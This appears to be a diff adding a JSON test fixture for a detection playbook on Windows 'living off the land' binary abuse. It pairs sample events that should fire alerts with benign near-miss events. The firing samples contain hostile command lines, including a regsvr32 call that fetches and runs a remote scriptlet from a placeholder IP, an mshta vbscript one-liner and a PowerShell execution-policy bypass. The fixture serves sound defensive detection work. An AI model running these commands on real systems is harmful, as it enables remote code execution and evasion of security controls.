@@ -1,0 +1,105 @@
+{
+ "playbook": "signal_lolbin_abuse",
+ "fires": [
+  {
+   "rule": "Mshta Proxy Execution",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc\"\"\")(window.close)",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Regsvr32 Proxy Execution",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /s /n /u /i:http://203.0.113.7/f.sct scrobj.dll",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Rundll32 Proxy Execution",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "PowerShell With Evasion Flags",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ep bypass -File C:\\Users\\Public\\a.ps1",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "rundll32 opening a control panel applet",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "regsvr32 registering a local DLL",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /s C:\\Program Files\\Vendor\\plugin.dll",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "plain PowerShell script",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -File C:\\scripts\\inventory.ps1",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
